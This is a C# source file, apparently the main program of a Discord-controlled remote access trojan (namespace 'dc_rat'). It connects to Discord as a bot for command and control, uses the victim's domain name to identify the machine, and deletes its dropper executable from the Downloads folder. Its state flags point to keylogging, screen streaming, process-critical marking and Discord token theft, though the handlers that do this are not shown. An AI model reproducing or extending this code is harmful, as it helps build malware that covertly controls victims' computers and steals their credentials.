using Discord;
using Discord.Commands;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using Discord.WebSocket;
using Microsoft.Extensions.DependencyInjection;
using Newtonsoft.Json.Linq;
using System.IO;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.Threading;

namespace dc_rat
{
    public class Program
    {
        public static bool iscritical;
        public static bool isstreaming;
        public static bool islogging;
        public static string clientId;
        public static string dcTokens;
        public static List<string> target = new List<string>();

        [STAThread]
        static void Main(string[] args) => new Program().MainAsync().GetAwaiter().GetResult();

        public async Task MainAsync()
        {
            if (File.Exists($"C:\\Users\\{Environment.UserName}\\Downloads\\ouhi89e4z5rtjg7.exe"))
            {
                File.Delete($"C:\\Users\\{Environment.UserName}\\Downloads\\ouhi89e4z5rtjg7.exe");
            }

            clientId = Environment.UserDomainName;

            using var services = ConfigureServices();

            var client = services.GetRequiredService<DiscordSocketClient>();

            client.Log += Log;
            services.GetRequiredService<CommandService>().Log += Log;

            string token = "INSERT TOKEN HERE"; //INSERT YOUR TOKEN HERE

            await client.LoginAsync(TokenType.Bot, token);
            await client.StartAsync();

            await services.GetRequiredService<CommandHandlingService>().InitializeAsync();

            await Task.Delay(-1);
        }

        public ServiceProvider ConfigureServices()
        {
            return new ServiceCollection()
                .AddSingleton(new DiscordSocketClient(new DiscordSocketConfig
                {
                    MessageCacheSize = 500,
                    LogLevel = LogSeverity.Info
                }))
                .AddSingleton(new CommandService(new CommandServiceConfig
                {
                    LogLevel = LogSeverity.Info,
                    DefaultRunMode = RunMode.Async,
                    CaseSensitiveCommands = false
                }))
                .AddSingleton<CommandHandlingService>()
                .BuildServiceProvider();
        }

        private Task Log(LogMessage log)
        {
            Console.WriteLine(log.ToString());
            return Task.CompletedTask;
        }
    }
}
